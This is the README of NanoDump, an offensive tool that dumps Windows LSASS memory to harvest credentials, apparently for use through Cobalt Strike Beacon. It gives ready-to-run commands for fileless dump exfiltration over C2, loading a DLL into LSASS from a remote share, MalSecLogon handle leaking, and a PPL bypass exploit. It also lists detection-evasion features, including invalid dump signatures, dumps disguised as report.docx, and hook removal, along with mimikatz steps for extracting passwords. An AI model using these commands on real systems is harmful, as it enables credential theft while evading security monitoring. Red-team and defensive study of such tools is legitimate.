# NanoDump

A flexible tool that creates a minidump of the LSASS process.

![screenshot](resources/demo.png)

<h2>Table of contents</h2>

<ol>
  <li><a href="#features">Features</a></li>
  <li><a href="#usage">Usage</a></li>
  <li><a href="#fork">Process forking</a></li>
  <li><a href="#snapshot">Snapshot</a></li>
  <li><a href="#handledup">Handle duplication</a></li>
  <li><a href="#malseclogon">MalSecLogon</a></li>
  <li><a href="#malseclogon-and-duplicate">MalSecLogon and handle duplication</a></li>
  <li><a href="#ssp">Load nanodump as an SSP</a></li>
  <li><a href="#ppl">PPL bypass</a></li>
  <li><a href="#params">Parameters</a></li>
  <li><a href="#examples">Examples</a></li>
  <li><a href="#redirectors">HTTPS redirectors</a></li>
</ol>

<h2 id="features">1. Features</h2>

<ul>
  <li>It uses syscalls (with <a href="https://github.com/jthuraisamy/SysWhispers2">SysWhispers2</a>) for most operations.</li> 
  <li>Syscalls are called from an <b>ntdll</b> address to bypass some syscall detections.</li> 
  <li>It sets the syscall callback hook to NULL.</li> 
  <li>Windows APIs are called using dynamic invoke.</li> 
  <li>You can choose to download the dump without touching disk or write it to a file.</li> 
  <li>The minidump by default has an invalid signature to avoid detection.</li> 
  <li>It reduces the size of the dump by ignoring irrelevant DLLs. The (nano)dump tends to be arround 10 MiB in size.</li> 
  <li>You don't need to provide the PID of LSASS.</li> 
  <li>No calls to <b>dbghelp</b> or any other library are made, all the dump logic is implemented in nanodump.</li> 
  <li>Supports process forking.</li> 
  <li>Supports snapshots.</li> 
  <li>Supports handle duplication.</li> 
  <li>Supports MalSecLogon.</li> 
  <li>Supports the PPL userland exploit.</li> 
  <li>You can load nanodump in LSASS as a Security Support Provider (SSP).</li> 
  <li>You can use the .exe version to run <b>nanodump</b> outside of Cobalt Strike :smile:.</li> 
</ul>

<h2 id="usage">2. Usage</h2>

<h3>Clone</h3>

```bash
git clone https://github.com/helpsystems/nanodump.git
```

<h3>Compile (optional)</h3>

<b>On Linux with MinGW</b>

```bash
make -f Makefile.mingw
```

<b>On Windows with MSVC</b> (No BOF support)

```bash
nmake -f Makefile.msvc
```

<h3>Import</h3>

Import the `NanoDump.cna` script on Cobalt Strike.


<h3>Run</h3>

Run the `nanodump` command in the Beacon console.

```
beacon> nanodump
```

<h3>Restore the signature</h3>

Once you downloaded the minidump, restore the invalid signature
```zsh
bash restore_signature.sh <dumpfile>
```

<h3>Get the secretz</h3>

<b>mimikatz:</b>  
To get the secrets simply run:
```
mimikatz # sekurlsa::minidump <dumpfile>
mimikatz # sekurlsa::logonPasswords full
```

<b>pypykatz:</b>  
If you prefer to stay on linux, you can use the python3 port of mimikatz called [pypykatz](https://github.com/skelsec/pypykatz).  
```sh
python3 -m pypykatz lsa minidump <dumpfie>
```

<h2 id="fork">3. Process forking</h2>

To avoid opening a handle to LSASS with `PROCESS_VM_READ`, you can use the `--fork` parameter.  
This will make nanodump create a handle to LSASS with `PROCESS_CREATE_PROCESS` access and then create a 'clone' of the process. This new process will then be dumped. While this will result in a process creation and deletion, it removes the need to read LSASS directly.

<h2 id="snapshot">4. Snapshot</h2>

Similarly to the `--fork` option, you can use `--snapshot` to create a snapshot of the LSASS process.  
This will make nanodump create a handle to LSASS with `PROCESS_CREATE_PROCESS` access and then create a snapshot of the process using `PssNtCaptureSnapshot`. This new process will then be dumped. The snapshot will be freed automatically upon completion.

<h2 id="handledup">5. Handle duplication</h2>

As opening a handle to LSASS can be detected, nanodump can instead search for existing handles to LSASS.  
If one is found, it will copy it and use it to create the minidump.  
Note that it is not guaranteed to find such handle.

<h2 id="malseclogon">6. MalSecLogon</h2>

To avoid opening a handle to LSASS, you can use MalSecLogon, which is a technique that (ab)uses `CreateProcessWithLogonW` to leak an LSASS handle.  
To enable this feature, use the `--malseclogon` parameter.  
Take into account that an unsigned nanodump binary needs to be written to disk to use this feature.

<h2 id="malseclogon-and-duplicate">7. MalSecLogon and handle duplication</h2>

As said before, using MalSecLogon requires a nanodump binary to be written to disk.  
This can be avoided if `--malseclogon` and `--dup` are used together with `--binary`.  
The trick is to leak a handle to LSASS using MalSecLogon, but instead of leaking it into nanodump.exe, leak it into another binary and then duplicate the leaked handle so that nanodump can used it.

<h2 id="ssp">8. Load nanodump as an SSP</h2>

You can load nanodump as an SSP in LSASS to avoid opening a handle. The dump will be written to disk with an invalid signature at `C:\Windows\Temp\report.docx` by default. Once the dump is completed, `DllMain` will return FALSE to make LSASS unload the nanodump DLL.  
To change the dump path and signature configuration, modify the function `NanoDump` in [entry.c](source/entry.c) and recompile.  

<h3>Upload and load a nanodump DLL</h3>

If used with no parameters, an unsigned nanodump DLL will be uploaded to the Temp folder. Once the dump has been created, manually delete the DLL with the `delete_file` command.  
```
beacon> load_ssp
beacon> delete_file C:\Windows\Temp\[RANDOM].dll
```
<h3>Load a local DLL</h3>

```
beacon> load_ssp c:\ssp.dll
```

<h3>Load a remote DLL</h3>

```
beacon> load_ssp \\10.10.10.10\openShare\ssp.dll
```


<h2 id="ppl">9. PPL bypass</h2>
If LSASS is running as Protected Process Light (PPL), you can try to bypass it using a userland exploit discovered by Project Zero. If it is successful, the dump will be written to disk.  

To access this feature, use the `nanodump_ppl` command
```
beacon> nanodump_ppl -v -w C:\Windows\Temp\lsass.dmp
```


<h2 id="params">10. Parameters</h2>

#### --getpid
Get PID of LSASS and leave.  
This is just for convenience, nanodump does not need the PID of LSASS.

#### --write -w < path > (required for EXE)
Where to write the dumpfile.
* **BOF**: If this parameter is not provided, the dump will be downloaded in a fileless manner.
* **EXE**: This parameter is required given that no C2 channel exists

#### --valid -v
The minidump will have a valid signature.  
If not entered, the signature will be invalid. Before analyzing the dump restore the signature of the dump, with:  
`bash restore_signature.sh <dumpfile>`  

#### --fork -f
Fork LSASS and dump this new process.

#### --snapshot -s
Create a snapshot of LSASS and dump this new process.

#### --dup -d
Try to find an existing handle to LSASS and duplicate it.

#### --malseclogon -m
Leak a handle to LSASS using MalSecLogon.  
**If used as BOF, an unsigned binary will be written to disk unless --dup is also provided!**

#### --binary -b < path >
Path to a binary such as `C:\Windows\notepad.exe`.  
This option is used exclusively with `--malseclogon` and `--dup`. 


<h2 id="examples">11. Examples</h2>

Read LSASS indirectly by creating a fork and write the dump to disk with an invalid signature:
```
beacon> nanodump --fork --write C:\lsass.dmp
```

Use MalSecLogon to leak an LSASS handle in a notepad process, duplicate that handle to get access to LSASS, then read it indirectly by creating a fork and download the dump  with a valid signature:
```
beacon> nanodump --malseclogon --dup --fork --binary C:\Windows\notepad.exe --valid
```

Get a handle with MalSecLogon, read LSASS indirectly by using a fork and write the dump to disk with a valid signature (a nanodump binary will be uploaded!):
```
beacon> nanodump --malseclogon --fork --valid --write C:\Windows\Temp\lsass.dmp
```

Download the dump with an invalid signature (default):
```
beacon> nanodump
```

Duplicate an existing handle and write the dump to disk with an invalid signature:
```
beacon> nanodump --dup --write C:\Windows\Temp\report.docx
```

Get the PID of LSASS:
```
beacon> nanodump --getpid
```

Load nanodump in LSASS as an SSP (a nanodump binary will be uploaded!):
```
beacon> load_ssp
beacon> delete_file C:\Windows\Temp\[RANDOM].dll
```

Load nanodump in LSASS as an SSP remotely:
```
beacon> load_ssp \\10.10.10.10\openShare\nanodump_ssp.x64.dll
```

Dump LSASS bypassing PPL, duplicating the handle that csrss.exe has on LSASS:
```
beacon> nanodump_ppl --dup --write C:\Windows\Temp\lsass.dmp
```

<h2 id="redirectors">12. HTTPS redirectors</h2>

If you are using an HTTPS redirector (as you should), you might run into issues when downloading the dump filessly due to the size of the requests that leak the dump.  
Increase the max size of requests on your web server to allow nanodump to download the dump.

#### NGINX
```
location ~ ^...$ {
    ...
    client_max_body_size 50M;
}
```
#### Apache2
```
<Directory "...">
    LimitRequestBody  52428800
</Directory>
```

## Credits
- [skelsec](https://twitter.com/skelsec) for writing [minidump](https://github.com/skelsec/minidump), which was crucial for learning the minidump file format.
- [freefirex](https://twitter.com/freefirex2) from [CS-Situational-Awareness-BOF](https://github.com/trustedsec/CS-Situational-Awareness-BOF) at Trustedsec for many cool tricks for BOFs
- [Jackson_T](https://twitter.com/Jackson_T) for [SysWhispers2](https://github.com/jthuraisamy/SysWhispers2)
- [BillDemirkapi](https://twitter.com/BillDemirkapi) for [Process Forking](https://billdemirkapi.me/abusing-windows-implementation-of-fork-for-stealthy-memory-operations/)
- [Antonio Cocomazzi](https://twitter.com/splinter_code) for [MalSecLogon](https://splintercod3.blogspot.com/p/the-hidden-side-of-seclogon-part-2.html)
- [xpn](https://twitter.com/_xpn_) for [Exploring Mimikatz - Part 2 - SSP](https://blog.xpnsec.com/exploring-mimikatz-part-2/)
- [Matteo Malvica](https://twitter.com/matteomalvica) for [Evading WinDefender ATP credential-theft: a hit after a hit-and-miss start](https://www.matteomalvica.com/blog/2019/12/02/win-defender-atp-cred-bypass/)
- [James Forshaw](https://twitter.com/tiraniddo) for [Windows Exploitation Tricks: Exploiting Arbitrary Object Directory Creation for Local Elevation of Privilege](https://googleprojectzero.blogspot.com/2018/08/windows-exploitation-tricks-exploiting.html)
- [itm4n](https://twitter.com/itm4n) for the original PPL userland exploit implementation, [PPLDump](https://github.com/itm4n/PPLdump).
